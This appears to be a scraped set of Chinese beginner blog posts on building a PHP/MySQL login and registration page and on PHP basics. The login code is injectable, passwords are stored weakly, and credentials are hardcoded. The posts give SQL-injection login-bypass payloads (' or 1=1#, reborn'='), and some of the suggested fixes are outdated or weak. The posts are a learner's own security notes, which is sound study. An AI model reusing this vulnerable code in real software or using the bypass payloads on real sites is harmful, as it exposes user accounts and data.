\"您的用户名或密码输入有误，&lt;a href=login.html&gt;请重新登录！&lt;/a&gt;\";&#125;?&gt; 漏洞1 上面的这一部分应该放在另放到一个PHP文件，并把这个PHP文件重点保护。在登录验证时，可以使用require_once() 语句，在脚本执行期间包括并运行这个PHP文件。因为如果攻击者获得了登录验证的源码，就会得到数据库的用户名和密码。 当phpstudy根目录(WWW目录)下的phpMyAdmin文件未删除时，攻击者会通过获得的数据库的用户名和密码，登进phpMyAdmin，查看管理员的数据库。(当然也可以考虑将phpMyAdmin文件删除，这样上面和下面的操作就可以忽略。当然，我没有删除)。 注意：若没有删除phpMyAdmin文件，还需要更改一下phpMyAdmin的登录用户名和密码，这个百度、谷歌上都有教程，可以参考一下。改好后，就可以防止直接从phpMyAdmin进入数据库啦！！ 漏洞2 观察上面的SQL查询命令，发现了使用动态拼装SQL语句。直接将用户提交过来的数据(用户名和密码)直接拿去执行，并没有实现进行特殊字符过滤，这是十分危险的。 当进行SQL注入攻击时，在用户名输入框中输入:’ or 1=1#,密码随便输入，这时候的合成后的SQL查询语句为： $sql=\"select * from users where username='' or 1=1#' and password='$password'\"; 分析：“#”在mysql中是注释符，这样井号后面的内容将被mysql视为注释内容，这样就不会去执行了，与以下sql语句等价：select * from users where username=&#39;&#39; or 1=1 #可以注释掉后面的一行SQL代码 相当于去掉了一个where条件。MySQL 注释, 过滤掉后面的SQL语句，使其不起作用。因为1=1永远是都是成立的，即where子句总是为真。 应对方法： 方法一： 对于这个语句，可以使用下面的技术对用户输入的内容进行过滤： （1）替换单引号，即把所有单独出现的单引号改成两个单引号，防止攻击者修改SQL命令的含义。再来看这个payload语句，select * from users where username=&#39;&#39;&#39; or &#39;&#39;1&#39;&#39;=&#39;&#39;1&#39; and password=&#39;&#39;&#39; or &#39;&#39;1&#39;&#39;=&#39;&#39;1&#39;显然会得到与select * from users where username=&#39;&#39; or &#39;1&#39;=&#39;1&#39; and password=&#39;&#39; or &#39;1&#39;=&#39;1&#39;不同的结果 （2）删除用户输入内容中的所有连字符，防止攻击者构造出类如select * from users where username= &#39;mas&#39; —— and password =&#39;&#39;之类的查询，因为这类查询的后半部分已经被注释掉，不再有效，攻击者只要知道一个合法的用户登录名称，根本不需要知道用户的密码就可以顺利获得访问权限。 （3）对于用来执行查询的数据库帐户，限制其权限。用不同的用户帐户执行查询、插入、更新、删除操作。由于隔离了不同帐户可执行的操作，因而也就防止了原本用于执行select命令的地方却被用于执行insert、update或delete命令。 方法二： 先通过SQL语句查询数据库，取出相关数据 function collect_data()&#123; require_once (\"mysql_connect.php\"); //在脚本执行期间包括并运行mysql_connect.php$sql = \"select * from users\"; //查询数据表语句，并用变量$sql存放$result = mysql_query($sql);//执行MySQL语句，并将结果用变量$result存放$colum= mysql_fetch_array($result);//获取和显示$result的数据return $colum;//返回变量$colum的数据&#125; 然后再将用户提交过来的数据(用户名和密码)和返回的数据进行比对，成功比对才能登录成功。 方法三： PHP有一个特制的功能以防止这些攻击。所有你需要做的就是使用一个函数mysql_real_escape_string()。 mysql_real_escape_string所做的是把一个输入的字符串,在MySQL查询时将它处理为用户输入的真实字符串，来防止SQL注入。就是将用户输入可能引起Mysql安全隐患的字符串比如单引号(‘)，用逃脱引用来表示\\ ‘。 将这个函数应用到上面那个可能被注入的例子中： $username = mysql_real_escape_string($_POST['username']);$password= mysql_real_escape_string($_POST['password']);$sql = \"select*from users where username= '$username' and password='$password'\"; 这里要十分小心的是，mysql_real_escape_string要先成功地通过mysql_connect连接到mysql server上以后才能正常使用,如果数据库 还没连接直接使用这个函数会报错。上面经过函数转化后，$sql最后打印出来的语句为： select*from users where username='$username\\' OR 1=1 -- and password='$password\\' OR 1=1 --' 也就是说变量$username和$password所存放的数据后面的单引号(‘)被转义为真实的输入字符，不再和$username和$password前的字符进行匹配，$username和$password前的单引号将和字符串–后面的单引号进行匹配。 让我们创建一个通用的函数，你可以用任何名字来命名它，在这里，我要将它命名为”mres”： function mres($var)&#123; if (get_magic_quotes_gpc())&#123;/*magic_quotes_gpc作用类似addslashes()，就是对输入的字符创中的字符进行转义处理，所有的 ‘ (单引号), ” (双引号), (反斜线) and 空字符会自动转为含有反斜线的溢出字符*/ $var = stripslashes(trim($var));//stripslashes删除由 addslashes() 函数添加的反斜杠 &#125; return mysql_real_escape_string(trim($var));&#125; 现在，可以把函数简化成下面这个样子： $username = mres($_POST['username']);$password = mres($_POST['password']);$sql = \"select*from users where username= '$username' and password='$password'\"; 漏洞3 is_array() 函数用于检测变量是否是一个数组，如果检测的变量是数组，则返回 TRUE，否则返回 FALSE。 很明显当SQL语句直接在数据库执行后。没有对结果进行有无特殊字符的判断和过滤。 当然，为了配合漏洞2的第二种应对方法。这里可以进行是否全等的判断 if(($colum['username']===$username) &amp;&amp; ($colum['password']===$password))&#123; if($i==1&amp;&amp;(setcookie('username',$_POST['username'],time()+3600)))&#123; echo\"&lt;script type='text/javascript'&gt;alert('登陆成功');location='index.php';&lt;/script&gt;\"; &#125;&#125; 这样就解决了这个问题。 漏洞貌似总结的差不多了耶！开心！！用常规SQL注入方法已经注入不进去了。但本人能力有限，若有其他漏洞，敬请大佬告知啊。本小白感激不尽！！！ 小白进阶ing","categories":[{"name":"Web","slug":"Web","permalink":"https://qwzf.gitee.io/blog/categories/Web/"}],"tags":[{"name":"BUG","slug":"BUG","permalink":"https://qwzf.gitee.io/blog/tags/BUG/"},{"name":"PHP","slug":"PHP","permalink":"https://qwzf.gitee.io/blog/tags/PHP/"},{"name":"SQL注入","slug":"SQL注入","permalink":"https://qwzf.gitee.io/blog/tags/SQL注入/"}],"author":"qwzf"},{"title":"php mysql  html css制作带Cookie登陆页面","slug":"php mysql  html css制作带Cookie登陆页面","date":"2019-04-26T02:08:26.561Z","updated":"2019-08-01T05:31:07.861Z","comments":true,"path":"2019/04/26/php mysql  html css制作带Cookie登陆页面/","link":"","permalink":"https://qwzf.gitee.io/blog/2019/04/26/php mysql  html css制作带Cookie登陆页面/","excerpt":"","text":"这两天写了个防绕过的带Cookie登录注册页面，学习借鉴了好多知识，感觉这些知识还是需要总结总结的，总结正在登录中。。。。。 1、登录(Login)1.登陆页面(login.html) Login的html实现代码 &lt;!DOCTYPE html&gt;&lt;html lang=\"zh-CN\"&gt; &lt;head&gt; &lt;meta http-equiv=\"Content-Type\" content=\"text/html; charset=utf-8\"&gt; &lt;title&gt;登录页面&lt;/title&gt; &lt;style&gt; *&#123;margin:0;padding:0;&#125;/*去掉页面样式*/ .content&#123; position:absolute;/*绝对定位*/ top:50%; left:0; width:100%; height:500px; margin-top:-220px; overflow:hidden;/*隐藏滚动条*/ opacity:0.6; &#125; .main&#123; text-align:center;/*文本居中*/ max-width:600px; height:500px; padding:100px 0px;/*上下80px,左右为0*/ margin:0 auto;/*设置上右下左,居中显示*/ background-color:#0099ee; &#125; .main h2&#123; font-size:70px;/*设置字体大小*/ font-weight:2px;/*调整字体粗细*/ &#125; form&#123; padding:30px 0; &#125; form input&#123; border:1px solid block; display:block; margin:0px auto 10px auto;/*上 右 下 左*/ padding:10px; width:280px; font-size:18px; font-weight:300px; text-align:center; &#125; form input:hover&#123; background-color:#0066aa; &#125; .button&#123; background-color:#0099ff; &#125; img&#123; width:100%; height:100%; &#125; &lt;/style&gt; &lt;/head&gt; &lt;body&gt; &lt;div class=\"content\"&gt; &lt;div class=\"main\"&gt; &lt;h2&gt;Login&lt;/h2&gt; &lt;form action=\"login_1.php\" method=\"post\" &gt;&lt;!--向login_1.php提交表单--&gt; 用户名&lt;input type=\"text\" name=\"username\" placeholder=\"username\" /&gt; 密码&lt;input type=\"password\" name=\"password\" placeholder=\"password\" /&gt; &lt;input type=\"submit\" value=\"立即登录\" class=\"button\" /&gt; &lt;a href=\"register.html\"&gt;用户注册&lt;/a&gt; &lt;/form&gt; &lt;/div&gt; &lt;/div&gt; &lt;img src=\"2.jpg\" /&gt; &lt;/body&gt;&lt;/html&gt; 2.登录验证(login_1.php)&lt;?phpheader('Content-type:text/html;charset=utf-8');$db = mysql_connect(\"localhost\",\"root\",\"root\")//mysql_connect()建立数据库连接//localhost:连接MySQL地址//root:连接MySQL用户名//root:连接MySQL密码 or die(\"连接数据库失败！\"); mysql_select_db(\"demo\",$db)//mysql_select_db()选择数据库，这里选择的是数据库名为demo的数据库 or die(\"您要选择的数据库不存在\".mysql_error());$username=$_POST['username'];//用$username存放从login.html表单提交过来的username$password=$_POST['password'];//用$password存放从login.html表单提交过来的password$sql=\"select * from users where username='$username' and password=md5('$password')\";/*用$sql存放sql查询判断命令，$password的数据进行md5加密*/$result = mysql_query($sql);//mysql_query()规定要发送的SQL查询，查询MySQL，存放于$result。注意：查询字符串不应以分号结束$colum= mysql_fetch_array($result);//mysql_fetch_array()获取和显示数据if(is_array($colum))&#123;//is_array()检测变量是否是数组 if(setcookie('username',$_POST['username'],time()+3600))&#123;//设置cookie header(\"Location:index.php\"); &#125; else&#123; echo 'Cookie设置失败'; &#125;&#125;else&#123; echo \"您的用户名或密码输入有误，&lt;a href=login.html&gt;请重新登录！&lt;/a&gt;\";&#125;?&gt; 2、注册(Register.html)1.注册页面(register.html) register的html实现代码 &lt;!DOCTYPE html&gt;&lt;html lang=\"zh-CN\"&gt; &lt;head&gt; &lt;meta http-equiv=\"Content-Type\" content=\"text/html; charset=utf-8\"&gt; &lt;title&gt;注册页面&lt;/title&gt; &lt;/head&gt;&lt;style type=\"text/css\"&gt; .main&#123; position:absolute;/*绝对定位*/ top:50%; left:0; width:100%; height:800px; margin-top:-220px; overflow:hidden;/*隐藏滚动条*/ opacity:0.6;/*透明度*/ &#125; .div&#123; text-align:center;/*文本居中*/ max-width:600px; height:500px; padding:100px 0px;/*上下80px,左右为0*/ margin:0 auto;/*设置上右下左,居中显示*/ background-color:#88eeff; &#125; .div h2&#123; font-size:70px;/*设置字体大小*/ font-weight:2px;/*调整字体粗细*/ &#125; form&#123; padding:30px 0; &#125; form input&#123; border:1px solid block; display:block; margin:0px auto 10px auto;/*上 右 下 左*/ padding:10px; width:280px; font-size:18px; font-weight:300px; text-align:center; &#125; form input:hover&#123; background-color:#005599; &#125; .button&#123; background-color:#00ffee; &#125; img&#123; width:100%; height:100%; &#125;&lt;/style&gt; &lt;body&gt;&lt;div class=\"main\"&gt; &lt;div class=\"div\"&gt; &lt;h2&gt;Register&lt;/h2&gt; &lt;form method=\"post\" action=\"register_1.php\"&gt; &lt;!--向register_1.php提交表单--&gt; 用户名&lt;input type=\"text\" name=\"username\"&gt; 密码&lt;input type=\"password\" name=\"password\"&gt; 再次输入密码：&lt;input type=\"password\" name=\"pwd_again\"&gt; &lt;input type=\"submit\" value=\"注册\" class=\"button\"&gt; &lt;/form&gt; &lt;/div&gt;&lt;/div&gt; &lt;img src=\"3.jpg\" /&gt;&lt;/body&gt; &lt;/html&gt; 2.注册验证(register_1.php)&lt;?php //注册验证 写入数据库$db = mysql_connect(\"localhost\",\"root\",\"root\")//mysql_connect()建立数据库连接//localhost:连接MySQL地址//root:连接MySQL用户名//root:连接MySQL密码 or die(\"连接数据库失败！\"); mysql_select_db(\"demo\",$db)//mysql_select_db()选择数据库，这里选择的是数据库名为demo的数据库 or die(\"您要选择的数据库不存在\".mysql_error());$username=$_POST['username']; //用$username存放从register.html表单提交过来的username$password=$_POST['password']; //用$password存放从register.html表单提交过来的password$pwd_again=$_POST['pwd_again'];//用$pwd_again存放从register.html表单提交过来的pwd_againif($password!=$pwd_again)&#123; echo\"两次输入的密码不一致,请重新输入！\"; echo\"&lt;a href='register.html'&gt;重新输入&lt;/a&gt;\"; &#125;else&#123; $sql1=\"select * from users where username='$username'\";//用$sql1存放存放sql查询判断命令 $check=mysql_query($sql1);//查询MySQL，存放结果于$check $colum= mysql_fetch_array($check);//获取和显示数据 if(is_array($colum))&#123; echo\"用户名重复，请重新注册\";echo\"&lt;a href='register.html'&gt;返回&lt;/a&gt;\"; &#125; else&#123; if(($username==''||$password==''))&#123; echo\"注册不成功！\";echo\"&lt;a href='register.html'&gt;返回&lt;/a&gt;\"; &#125; else&#123; $sql=\"insert into users(username,password) values('$username','$password')\";/*该sql命令是，将变量$username和$password的数据，加入到表名为users且字段名为username和password的数据中。并把该命令存放变量$sql中*/ $result=mysql_query($sql);//查询MySQL，存放结果于$result if(!$result)&#123; echo\"注册不成功！\";echo\"&lt;a href='register.html'&gt;返回&lt;/a&gt;\"; &#125; else&#123; echo\"注册成功!\";echo\"&lt;a href='login.html'&gt;请登录&lt;/a&gt;\"; &#125; &#125; &#125; &#125; ?&gt; 3、登录成功(index.php) index的php实现代码 &lt;?phpheader(&apos;Content-type:text/html;charset=utf-8&apos;);if(!isset($_COOKIE[&apos;username&apos;]))&#123;//判断是否是正常登录，正常登录设置了cookie,未设置cookie即为非法登录 echo &apos;您的登录非法，请&lt;a href=&quot;login.html&quot;&gt;重新登录&lt;/a&gt;&apos;; exit();//结束整个代码运行&#125;?&gt;&lt;!DOCTYPE html&gt;&lt;html lang=&quot;zh-CN&quot;&gt; &lt;head&gt; &lt;meta charset=utf-8&quot; /&gt; &lt;title&gt;欢迎登录&lt;/title&gt; &lt;style&gt; .show&#123; position:absolute;/*绝对定位*/ top:50%; left:0; width:100%; height:500px; margin-top:-220px; overflow:hidden;/*隐藏滚动条*/ opacity:0.6; &#125; .show h2&#123; text-align:center;/*文本居中*/ max-width:600px; height:400px; padding:100px 0px;/*上下80px,左右为0*/ margin:0 auto;/*设置上右下左,居中显示*/ &#125; img&#123; width:100%; height:100%; &#125; &lt;/style&gt; &lt;/head&gt; &lt;body&gt; &lt;div class=&quot;show&quot;&gt; &lt;h2&gt;Hello World!&lt;br /&gt;&lt;a href=&quot;logout.php&quot;&gt;点击注销&lt;/a&gt;&lt;/h2&gt;//跳转到logout.php，实现清除cookie操作 &lt;/div&gt; &lt;img src=&quot;1.jpg&quot; /&gt; &lt;/body&gt; 4、注销(logout.php)&lt;?phpheader('Content-type:text/html;charset=utf-8');if(isset($_COOKIE['username']))&#123;//如果设置了cookie if(setcookie('username',$_POST['username'],time()-3600))&#123;//清除cookie，跳转到登录页面 header('Location:login.html'); &#125; else&#123; echo '注销失败'; header('Location:logout.php'); &#125;&#125;?&gt; 5、数据库操作语句写登录验证的时候，发现很多数据库的操作命令忘得差不多了，还是总结下比较好，加深加深自己的印象。。。 创建数据库：create database 数据库名称; 删除数据库：drop database 数据库名称; 创建数据表：create table 表名 ( id int ,username varchar(35),password varchar(40)); ​ id username password 是字段 ,后面的限制是类型 删除数据表：drop table 表名; 选择数据库：use mydata; 增记录：insert into 表名(id,username,password) values(&#39;6&#39;,&#39;$username&#39;,&#39;password&#39;)； ​ id username password 是字段,后面6、$username、$password是记录 删记录：delete from users where id=5; ​ 删除了在表格users中id=5的那条记录，id=5即为范围 改记录：update 表名 set 字段=‘数据’ where 范围; 查： ​ 查库：show databases； ​ 查所有表：show tables； ​ 查表：select*from 表名； ​ 查字段：select*from 表名 where 范围； ​ 查表结构：desc 表名； 6、登录页面的漏洞1.or，–+，#未被过滤填好正确的用户名和密码后，点击提交，将会返回给我们“Hello World!”的界面 select * from users where username=&#39;$username&#39; and password=md5(&#39;$password&#39;) 如果用户名和密码如果正确，就能够成功登陆。但是，如果输入一个错误的用户名或密码呢?很明显，肯定登入不了吧。对于有SQL注入漏洞的网站来说，只要构造个特殊的“字符串”，照样能够成功登录。 如：在用户名输入框中输入:’ or 1=1#或admin’and 1=1 #或admin’#密码随便输入，这时候的合成后的SQL查询语句为： select * from users where username=&#39;&#39; or 1=1#&#39; and password=md5(&#39;&#39;) 语义分析：“#”在mysql中是注释符，这样#号后面的内容将被mysql视为注释内容（相当于去掉了一个where条件），这样就不会去执行，与以下sql语句等价： select * from users where username=&#39;&#39; or 1=1#&#39; and password=md5(&#39;&#39;) select * from users where username=&#39;&#39; or 1=1 MySQL 注释, 过滤掉后面的SQL语句，使其不起作用 因为1=1永远是都是成立的，即where子句总是为真，将该sql进一步简化之后，等价于如下select语句： select * from users，该sql语句的作用是检索users表中的所有字段 2、or，–+，#被过滤假设后台sql查询语句为： select * from users where username=’$username’ and password=’$password’ 构造payload(此时的我还不知payload是什么)： reborn’=&#39; 这时候SQL查询语句为： select * from user where username=’reborn’=” and password=’reborn’=” username=’reborn’返回值为0，相当于false，然后0=”的结果为1，相当于true 即注入语句相当于 select * from user where 1 and 1 这是我对我这个登录页面存在的漏洞的简单总结，更多登录框SQL注入漏洞请看这位大佬的博客CTF| SQL注入之login界面，我觉得总结得挺详细的。。。 小白进阶ing。。。。","categories":[{"name":"Web","slug":"Web","permalink":"https://qwzf.gitee.io/blog/categories/Web/"}],"tags":[{"name":"MySQL","slug":"MySQL","permalink":"https://qwzf.gitee.io/blog/tags/MySQL/"},{"name":"php","slug":"php","permalink":"https://qwzf.gitee.io/blog/tags/php/"},{"name":"html","slug":"html","permalink":"https://qwzf.gitee.io/blog/tags/html/"},{"name":"css","slug":"css","permalink":"https://qwzf.gitee.io/blog/tags/css/"},{"name":"Databases","slug":"Databases","permalink":"https://qwzf.gitee.io/blog/tags/Databases/"}],"author":"qwzf"},{"title":"Web开发-PHP基础篇(一-二)","slug":"Web开发-PHP基础篇(一~二)","date":"2019-04-15T12:22:18.275Z","updated":"2019-08-01T05:22:03.935Z","comments":true,"path":"2019/04/15/Web开发-PHP基础篇(一~二)/","link":"","permalink":"https://qwzf.gitee.io/blog/2019/04/15/Web开发-PHP基础篇(一~二)/","excerpt":"","text":"学前准备学前准备：html、css PHP超文本预处理器 PHP 是一种创建动态交互性站点的强有力的服务器端脚本语言。 php擅长网站开发 php吸收c java perl 允许网站开发人员快速编写的动态页面（信息的更新) php可以运行在windows，linux等各种操作系统上！ 浏览器&gt;输入url地址&gt;显示网站内容 网络主机(硬件)运行 Web服务器(软件) apache管理web服务器 php应用服务器执行php代码，交给apache mysql数据库管理系统 可单独安装一台计算机里 url地址 格式：http://host[:port][abs_path] 理解： http://表示要通过HTTP协议定位网络资源 host表示合法的internet主机域名或者ip地址 port指定一个端口号，可以省略默认为80端口 abs_path被请求资源的位置 DNS服务器：IP 域名 一、PHP基本语法1、初识PHP脚本程序1.PHP语言标记(1)PHP开始标记 &lt;?php (2)PHP结束标记 ?&gt; //完整开始结束写成：&lt;?php ?&gt; php解析器叫做PHP应用服务器 (3)我们的页面最终是通过html,css,js来展示出一个炫丽的界面(4)PHP代码可以嵌入到html代码中任何位置，并且可以嵌入任意多个 (5)文件末尾的?&gt;结束标志可以省略2.指令分隔符”;”(1)在一些PHP语句的结尾要加上;表示一句话的结束,当然 也不需要可以的去记，因为你一旦漏掉分号，程序根本执行不了，会报错!(2)结束标记?&gt;就隐含了一个; 所以在?&gt;之前的PHP语句可以省略掉;3.注释(1)多行注释 /* 多行注释*/ (2)单行注释 //我是单行注释 4.遇到空白的处理空格，tab制表符，换行 (在英文输入法中)这些写在咱们的PHP代码里面是没有问题的。 可以利用这些空白 来增加我们代码的清晰性和可读性! 2、变量变量是用于临时（只有在我们的程序的运行过程中才存在）存储值（数据）的容器 1.变量的声明 在我们一些编程语言里面比如C语言 使用变量之前要事先通知，事先声明一下！ 注意：在我们的PHP程序里面 使用变量之前是不需要声明的！ 变量用于存储 数字、文本字符串 或者数组这些数据! $变量名=数据(值) = 在数学里面是‘等于’的意思,在我们的程序语言里面，它不是等于号，它是 ‘赋值操作符’ 2.变量的释放(销毁) unset($变量名称)$and1=1;unset($and1);//销毁$and1变量echo $and1;//提示出错，因为变量已经被销毁了！ 3.变量的命名规则(1)变量名称严格区分大写$name,$NAME,$Name都是不同的变量(2)字母或者下划线开头，后面接任意数量的字母数字下划线都可以! 例： $nameudhfdjkjv$_1464fbgrf 错误的命名方式： $1name 错误点：以数字开头了$n ame 错误点：中间有空白字符 总结一下：**变量名只能包含 字母 数字 下划线 并且必须以字母或者下划线开头**！ (3)最好不要用一些关键字作为变量名称(因为在其他的编程语言里面是完全不被允许的)! 关键字： 4.可变变量 //可变变量$abc='test';//定义了一个变量$abc里面存了值test$$abc='小明';//$test='小明';echo $test; 5.变量的引用赋值 $a=1000;/*$b=$a;//相当于把$a的值，复制一份再赋值给$b这个变量*/$b=&amp;$a;//相当于给$a起了一个别名，操作其中任何一个，都会影响到另外一个变量的值!$b=20;echo $a; 3、变量类型概述：变量类型是指保存在该变量中的数据类型。PHP(弱类型语言)对变量类型看的比较淡 使用var_dump(变量名)可以输出变量的类型和变量值！ 1.变量类型简介 (1）bool (布尔型) $a=true;var_dump($a); 往变量里面存true或false，那这个变量就是布尔型 (2）int (整型) 往变量里面存整数，那这个变量就是整型 (3）float (浮点型，也称double) $a=1.1;var_dump($a); 往变量里面存小数，那这个变量就是浮点型 (4）string (字符串) 字符串就是是一系列的字符组成串在一起 1单引号： $b=1;$a='qwzftest..';var_dump($a);echo $a; 单(双)引号里不能直接放单引号！！要放单引号，需要在单引号前加反斜杠\\转义 如： $a='qwzftest\\'afc'; 单引号里的变量不会被解析。所以在定义一些简单的字符串的时候使用单引号，效率比较高 2双引号 $b=100;$a='te$bst......';$a=\"te&#123;$b&#125;st......\";//双引号里的变量$b(&#123;$b&#125;)会被解析var_dump($a);echo $a; 3定界符 $b=200;$a=&lt;&lt;&lt;wwwdwqdqwdwq&#123;$b&#125;dwqdqdqdqdwqdwqcwcfwefwefcscwecwww;var_dump($a); (5）array (数组) (6）object (对象) (7）resource (资源) (8）NULLnull表示一个变量没有值，表示空将变量直接赋值为null声明的变量尚未被赋值被unset函数销毁的变量 $a=1234;unset($a);var_dump($a); 2.变量类型相互转换 强制转换: $a='小明';$b=(int)$a;var_dump($a);var_dump($b); 4、常量1.概念：常量是用于临时（只有在我们的程序的运行过程中才存在）存储值（数据）的容器2.定义和使用 define(&#39;常量名称&#39;,常量值) 或者 define(&quot;常量名称&quot;,常量值) 常量的命名：(1)和变量一样 只能包含字母数字下划线 并且必须以 字母或者下划线开头(2)按照惯例常量名字总是大写的(3)自定义的常量是严格区分大小写的defined()函数来检查是否定义了某个常量 3.常量和变量的区别 (1)常量前面没有美元符号($)(2)常量只能用define()函数定义，不能通过赋值语句(3)常量可以不用理会变量范围的规则而在任何地方定义和使用(4)常量一旦被定义就不能被重新定义或者取消定义(5)常量的值只能是bool,int,float,string类型 4.预定义常量 预定义常量就是PHP内核已经帮我们定义好的常量 其中有的预定义常量是一__开头的，这些预定义常量我们又叫它魔术常量 代码所在的位置不同,值也是不同的，所以它叫魔术常量八个常用的魔术常量 预定义常量是不区分大小写的 5、运算符概述：一些符号，这些符号可以将变量或者数据执行某中运算！1.算术运算符(1)+ $a=1;$b=2;$c=$a+$b;echo $c; (2)-第一个意思： 减号 $a=10;$b=2;$c=$a-$b;echo $c; 第二个意思： 取反 $a=1;$b=-$a;echo $b;//-1echo '&lt;br /&gt;';echo $a;//1 注意：取反并不会影响到被取反变量本身的值!(3)* 乘号 $a=4;$b=2;$c=$a*$b;echo $c; (4)/ 除号 $a=10;$b=2;$c=$a/$b;echo $c; (5)% 取模 $a=12;$b=2;echo $a%$b; (6)++ 自增前++当在一个语句里面需要使用到被自增的变量的值的时候，前++会先执行自增,然后再返回自增之后的值！ $a=10;echo ++$a;//11 后++当在一个语句里面需要使用到被自增的变量的值的时候，后++会先返回变量的值然后再去执行自增 $a=10;//++$a;//$a=$a+1;//$a++;//$a=$a+1;echo $a++;//echo $a;$a=$a+1;echo '&lt;br /&gt;';echo $a;//11 注意： $a=10;++$a;//这种情况不需要用到自增变量值的时候，和后++无区别echo $a; (7)-- 自减前– $a=10;//$a--;//$a=$a-1; 和--$a没区别;echo --$a;//$a=$a-1;echo $a;echo '&lt;br /&gt;';echo $a; 后– $a=10;//$a--;//$a=$a-1; 和--$a没区别;echo $a--;//echo $a;$a=$a-1;echo '&lt;br /&gt;';echo $a; 注意：自增或者自减是对变量而言的！ 2.字符串运算符 . 连接运算符$a='小明';$b='测试字符串连接符';echo $a.$b; 3.赋值运算符注意：赋值运算符整个语句是有值的，所以整个语句就是一个表达式，所以我们也可以这么写：$a=$b=2;相当于$a=($b=2);也相当于$a=2;$b=2;= 把右边的值赋给左边的变量$a=1;二元运算符 表达式是 PHP 最重要的基石。在 PHP 中，几乎所写的任何东西都是一个表达式。简单但却最精确的定义一个表达式的方式就是“任何有值的东西”。 +=$a=1;$b=2;$a+=$b;//$a=$a+$b;echo $a; -=$a=2;$b=1;$a-=$b;//$a=$a-$becho $a; 4.比较运算符概念：对操作数（按照比较运算符的要求,规则）进行比较。如果比较出的结果满足比较运算符的要求那么结果就是true(真，成立，满足),否则就是false（假，不成立,不满足）PHP中规定：使用echo输出布尔类型值的时候echo true;它在页面中会输出1echo false;它会在页面中什么都不输出所以说我们在测试的过程中如果需要输出布尔类型值的时候我们最好使用var_dump()来输出更明了的结果！(1)== 值是否相等如果值相等则就是 true（真，成立）如果值不相等那么就是false（假，不成立） $a=1;$b=1;var_dump($a==$b);//true (2)=== 全等（值要相等，类型也要相等）如果两边操作数的值 全等那么就是true否则就是false $a=11;$b='11';//var_dump($a==$b);//truevar_dump($a===$b);//false 3)!= 值是否不相等如果两边操作数的值不相等那么就是true，否则就是false $a=1;$b=11;var_dump($a!=$b);//true (4)&lt;&gt; 同上(5)!== 不全等如果两边的操作数不全等那么就是true，否则就是false /*$a=1111;$b=2;var_dump($a!=$b);//truevar_dump($a!==$b);//true*/$a=11;$b='11';var_dump($a!=$b);//falsevar_dump($a!==$b);//true,$a不全等于$b (6)&lt; 小于比较两边操作数的值，前面的是否小与后面的 $a=1;$b=1;var_dump($a&lt;$b);//false,$a小与$b这句话正确还是错误 (7)&gt; 大于 $a=10;$b=1;var_dump($a&gt;$b); (8)&lt;= 小于等于 $a=1;$b=1;var_dump($a&lt;=$b);//$a小与等于$b就是true,否则就是false (9)&gt;= 大于等于 $a=2;$b=1;var_dump($a&gt;=$b);//true ​ 5.逻辑运算符概念：对表达式进行逻辑运算，运算出的结果是布尔类型的值（true,false）要求：参与逻辑运算的表达式的值是布尔类型的值，如果不是布尔类型的值会被PHP自动转换成布尔类型的值，然后再参与运算！(1)逻辑与and 或者 &amp;&amp;运算规则：左右两边的表达式的值都为true的时候，运算的结果就是true 否则只要其中任意一个为false，运算的结果就是false;现实举例： true 及格 false 不及格 左右两边的表达式就是我们要考试的科目;要求：当语文和数学都及格的时候那么，最终的结果才能够通过(true),否则就是不通过(false) $a=false;//语文$b=true;//数学var_dump($a &amp;&amp; $b); 中间隐含一个问题：“短路”,运算符的优先级的问题！我们的程序语言的设计者认为： 只要有逻辑运算符 （逻辑与，逻辑或）那么运算结果就是就是一个true或者false那个这个整个运行的过程就不重要了！当然短路问题并不会遇到太多，就算遇到也不会有什么影响！ (2)逻辑或or 或者 ||运算规则：左右两边的表达式的值有一个为true，运算的结果就是true，只有当两边的值都是false的时候，结果才会是false 例： $a=false;//语文$b=true;//数学var_dump($a || $b); 现实举例：要求：当语文和数学有一门及格那么最终的结果就是通过true中间隐含一个问题：“短路”,运算符的优先级的问题！我们的程序语言的设计者认为： 只要有逻辑运算符 （逻辑与，逻辑或）那么运算结果就是就是一个true或者false那个这个整个运行的过程就不重要了！当然短路问题并不会遇到太多，就算遇到也不会有什么影响！ (3)逻辑异或xor运算规则：左右两边的表达式的值不一样的时候结果就是true,如果一样那么运算的结果就是false 例： $a=false;$b=false;var_dump($a xor $b); (4)逻辑非!运算规则：将原来表达式的值否定掉，原来是true，那么结果就是false。原来是false，那么结果就是true6.位运算符7.其他运算符(1)? :三元运算格式： 表达式1 ? 表达式2 : 表达式3;如果表达式1的值为true,那么就执行表达式2,否则那么就执行表达式3$a=false ? 10 : 20;echo $a;//20 (2)可以把系统的命令放在里面执行！ 涉及到跨平台: $a=`ipconfig`;$b=`ifconfig`;var_dump($b); (3)@屏蔽表达式可能发生错误！echo @$a;(4)=&gt;(5)-&gt;(6)instanceof8.运算符的优先级优先级的概念：谁的优先级别高就先算谁结合方向：规定了从那个方向开始算的问题！优先级归纳:(1)[无]递增递减(2)[右]逻辑非!(3)[左]乘，除，取余(4)[左]加，减，字符串连接符(5)[无]包含大于号或者小于号的比较运算符(6)[无]不包含大于号或者小于号的比较运算符(7)[左]逻辑与&amp;&amp;(8)[左]逻辑或||(9)[左]? :(10)[右]赋值运算符(12)[左 ]逻辑异或xor圆括号的作用：用圆括号可以将表达式里面的某一块看成一个整体！使用括号可以增强代码的可读性。 二、流程控制对PHP程序执行的过程进行控制！ 1、顺序执行自上而下的执行即可！ 对这个执行过程没有控制! 2、分支执行分支执行可以根据条件是否满足来选择执行某些代码，PHP的分支执行主要通过两种语句（if，switch）来实现！1.if语句注意：我们if语句的表达式所控制的代码，最好用花括号括起来，哪怕就是一条语句也用花括号括起来！ if语句可以嵌套，这是根据实际需求来的！（1)单向条件if(表达式) 语句1;表达式的值为true 那么就执行语句1,否则就不执行！ 例： $pass=60;$a=40;if($a&gt;=$pass)&#123;echo '恭喜，考试通过';echo 'dwqdwqdq';//.......各种其他语句！&#125;echo '代码执行结束！'; (2)双向条件 例： $pass=60;$a=40;if($a&gt;=$pass)&#123;echo '恭喜你！考试通过啦！';//.......&#125;else&#123;echo '很遗憾，您的科目没有通过！';//.......&#125; (3)多向条件 例： $a=84;$grade1=60;//低于60不及格$grade2=75;//及格$grade3=85;//良好if($a&lt;$grade1)&#123;echo '不及格';&#125;elseif($a&lt;$grade2)&#123;echo '童鞋你及格了';&#125;elseif($a&lt;$grade3)&#123;echo '良好！';&#125;else&#123;echo '优秀';&#125; 2.switch语句 switch(表达式)&#123; case 值 1://case相当于== 语句块1; break; case 值 2: 语句块2; break; ....... default: 语句块n&#125; 